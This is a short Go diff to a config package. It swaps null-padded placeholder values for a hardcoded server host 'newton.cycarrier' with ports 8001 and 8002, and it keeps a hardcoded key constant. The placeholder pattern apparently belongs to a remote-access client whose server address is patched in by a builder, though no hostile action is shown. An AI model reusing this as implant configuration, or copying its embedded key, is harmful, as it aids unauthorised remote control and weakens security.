@@ -2,7 +2,7 @@
 
 package config
 
-import "strings"
+//import "strings"
 
 const(
   Key             string  = "ju5T4K3Yd0nTc4t3"
@@ -14,6 +14,9 @@ const(
 )
 
 var(
-  ServerIP        string  = strings.TrimRight("XXXXXXXXXXXXXXX", "\x00")
-  ServerPort      string  = ":" + strings.TrimRight("OOOOO", "\x00")
+  //ServerIP        string  = strings.TrimRight("XXXXXXXXXXXXXXX", "\x00")
+  //ServerPort      string  = ":" + strings.TrimRight("OOOOO", "\x00")
+  ServerIP        string  = "newton.cycarrier"
+  ServerPort      string  = ":8001"
+  FServerPort     string  = ":8002"
 )
